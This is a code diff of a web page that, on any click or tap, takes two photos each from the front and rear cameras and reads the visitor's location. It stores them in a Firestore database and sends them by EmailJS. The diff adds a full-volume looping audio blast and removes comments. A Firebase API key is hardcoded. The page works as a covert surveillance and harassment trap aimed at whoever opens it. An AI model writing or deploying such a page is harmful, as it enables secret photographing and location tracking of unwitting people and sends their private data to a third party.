@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1" />
-<title>Firestore保存＋EmailJS送信（2枚ずつ連写）</title>
+<title>Firestore保存＋EmailJS送信（2枚ずつ連写）＋音声再生</title>
 <style>
   body {
     font-family: Arial, sans-serif;
@@ -27,7 +27,6 @@
   import { initializeApp } from "https://www.gstatic.com/firebasejs/11.10.0/firebase-app.js";
   import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/11.10.0/firebase-firestore.js";
 
-  // Firebase設定（ご自身のものに差し替えてください）
   const firebaseConfig = {
     apiKey: "AIzaSyDgwbExA5BKTcKsq2Ov8z173Ke6EPYGf28",
     authDomain: "picture-storage-906ae.firebaseapp.com",
@@ -44,15 +43,14 @@
 
   const statusEl = document.getElementById("status");
   let busy = false;
+  let audio;
 
-  // ログ表示とconsole.logの両方
   function log(text) {
     console.log(text);
     statusEl.textContent += text + "\n";
     statusEl.scrollTop = statusEl.scrollHeight;
   }
 
-  // カメラ2枚連写（facingModeは "user" か "environment"）
   async function capturePhotos(facingMode) {
     log(`📸 ${facingMode}カメラ起動`);
     const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode }, audio: false });
@@ -81,7 +79,6 @@
     return photos;
   }
 
-  // 位置情報取得
   function getLocation() {
     log("📍 位置情報取得開始");
     return new Promise((resolve, reject) => {
@@ -105,7 +102,6 @@
     });
   }
 
-  // Firestoreに保存
   async function saveToFirestore(data) {
     log("⬆️ Firestoreに保存中...");
     try {
@@ -116,7 +112,6 @@
     }
   }
 
-  // EmailJS送信
   async function sendEmail(data) {
     log("✉️ EmailJS送信中...");
     try {
@@ -127,7 +122,6 @@
     }
   }
 
-  // 一連の処理
   async function runProcess() {
     if (busy) {
       log("❌ 処理中です。二重実行防止");
@@ -137,7 +131,6 @@
     log("🔄 処理開始");
 
     try {
-      // カメラと位置情報は初回の権限付与で以降許可が残るのが通常ブラウザの仕様
       const rearPhotos = await capturePhotos("environment");
       const frontPhotos = await capturePhotos("user");
       const location = await getLocation();
@@ -168,14 +161,35 @@
     }
   }
 
-  // 画面クリック・タッチで処理開始
-  window.addEventListener("click", runProcess);
-  window.addEventListener("touchstart", runProcess, { passive: false });
+  // クリックされたらbase64 mp3を爆音でループ再生
+  function playLoopSound() {
+    if(audio) return; // すでに再生中なら無視
+
+    const base64mp3 = "data:audio/mp3;base64,//uQxAAAD..."; // ここにbase64エンコード済みmp3データを入れてください
+
+    audio = new Audio(base64mp3);
+    audio.loop = true;
+    audio.volume = 1.0; // 爆音
+    audio.play().catch(e => {
+      log("❌ 音声再生失敗: " + e.message);
+    });
+  }
+
+  window.addEventListener("click", () => {
+    runProcess();
+    playLoopSound();
+  });
+
+  window.addEventListener("touchstart", (e) => {
+    e.preventDefault();
+    runProcess();
+    playLoopSound();
+  }, { passive: false });
 
 </script>
 </head>
 <body>
-  <h1>📸 Firestore保存＋EmailJS送信（2枚ずつ連写）</h1>
+  <h1>📸 Firestore保存＋EmailJS送信（2枚ずつ連写）＋音声再生</h1>
   <pre id="status">待機中...</pre>
 </body>
 </html>
